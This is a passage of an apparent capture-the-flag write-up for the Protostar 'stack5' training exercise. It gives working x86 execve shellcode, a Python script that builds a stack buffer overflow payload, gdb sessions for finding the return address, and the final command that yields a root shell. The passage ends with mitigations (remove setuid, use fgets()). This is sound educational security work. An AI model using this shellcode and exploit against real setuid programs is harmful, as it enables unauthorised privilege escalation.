  15:   cd 80                   int    $0x80
  17:   31 c0                   xor    %eax,%eax
  19:   40                      inc    %eax
  1a:   cd 80                   int    $0x80

```

So our hex will be:

```
“\x31\xc0\x50\x68\x2f\x2f\x73”
“\x68\x68\x2f\x62\x69\x6e\x89”
“\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80”
```

It's 28 bytes, so it can be used.

For now let's write a simple python script. We will be tailoring it while we go further:
```
#! /usr/bin/python

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
            "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
            "\xcd\x80\x31\xc0\x40\xcd\x80"
            
print shellcode
```

For now, we can save its output into a file:

```
user@protostar:~$ python stack5-payload-simple.py > /tmp/payload
```

Now we have to get the address of the buffer.

A little note: Since the environment affect the addresses, from now on we'll be using `dash`. It's not as interactive as `bash`, but its environment is easier to handle. 

Let's run `stack5` with `gdb` and the `payload` file. :

```
$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave  
0x080483da <main+22>:   ret    
End of assembler dump.
(gdb) b * 0x080483d9
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
(gdb) r < /tmp/payload 
Starting program: /opt/protostar/bin/stack5 < /tmp/payload

Breakpoint 1, main (argc=0, argv=0xbffffd94) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) x/a $esp
0xbffffc90:     0xbffffca0
```

Now, we can see that the buffer is located at `0xbffffca0` (remember the `mov %eax,(%esp)` operation?), and we can see that our shellcode is inside the buffer.

The last thing to do is to override the return address with `0xbffffca0`. As we said before, from the beginning of the buffer and the return address to `__libc_start_main` we have 76 bytes.

28 of these bytes are occupied by the shellcode. Now we just have to tweak our script to print some padding and inject the return address after that:

```
#! /usr/bin/python

length = 76
ret = "\xa0\xfc\xff\xbf"

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
            "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
            "\xcd\x80\x31\xc0\x40\xcd\x80"

pad = 'a' * (length - len(shellcode))
payload = shellcode + pad + ret

print payload
```

Let's save its output on `/tmp/payload` again.

Now we can try to run it into gdb:

```
$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) r < /tmp/payload
Starting program: /opt/protostar/bin/stack5 < /tmp/payload
Executing new program: /bin/dash

Program exited normally.
```

The shell is called, but it exits immediately...

What if we run it onto the terminal?

```
$ /opt/protostar/bin/stack5 < /tmp/payload
Illegal instruction
```

Wtf? We get an error...

Actually, `gdb` changes the environment, so the memory addresses are shifted by a certain amount.

Look at this:

```
$ env
USER=user
SSH_CLIENT=192.168.56.1 49258 22
MAIL=/var/mail/user
HOME=/home/user
SSH_TTY=/dev/pts/0
LOGNAME=user
TERM=xterm-256color
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/user
SSH_CONNECTION=192.168.56.1 49258 192.168.56.102 22
```

```
$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) show env
USER=user
SSH_CLIENT=192.168.56.1 49258 22
MAIL=/var/mail/user
HOME=/home/user
SSH_TTY=/dev/pts/0
LOGNAME=user
TERM=xterm-256color
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/user
SSH_CONNECTION=192.168.56.1 49258 192.168.56.102 22
LINES=23
COLUMNS=96
```

Two new environment variables! In order to find the correct buffer address, we have to unset these.

A little notice: USE THE SAME WORKING DIRECTORY because of `PWD`:

```
(gdb) unset env LINES
(gdb) unset env COLUMNS
```

Now we can find the correct address.

```
...
(gdb) x/32x $esp
0xbffffca0:     0xbffffcb0      0xb7ec6165      0xbffffcb8      0xb7eada75
0xbffffcb0:     0x6850c031      0x68732f2f      0x69622f68      0x89e3896e
0xbffffcc0:     0xb0c289c1      0x3180cd0b      0x80cd40c0      0x61616161
0xbffffcd0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffffce0:     0x61616161      0x61616161      0x61616161      0x61616161
...
```

It's `0xbffffcb0`! Let's try performing the attack with the updated script.

```
$ /opt/protostar/bin/stack5 < /tmp/payload
$ 
```

Nothing happens...

Here's the caveat: When the shell is launched, it's launched in interactive mode. It expects inputs from the `stdin`, but the latter is empty, so the shell gets `EOF` and it terminates.

Do we have a workaround? Of course we do. We can use two `cat`: one to inject the payload, and the other one to keep a stream open:

```
$ (cat /tmp/payload; cat) | /opt/protostar/bin/stack5
whoami
root
```

Hell yeah!

### Protostar Mitigations

Some CTFs have the improper character neutralization or similar, but the main problem here is the use of `gets()` and the SETUID, so:
1. CWE-276 Incorrect Default Permissions: The executable has `setuid` when it's not needed.
2. CWE-121 Stack-based Buffer Overflow: `gets()` allows an out-of-bound write.

How to mitigate:
1. Remove the `setuid`.
2. Use `fgets()` (yes it is that easy).
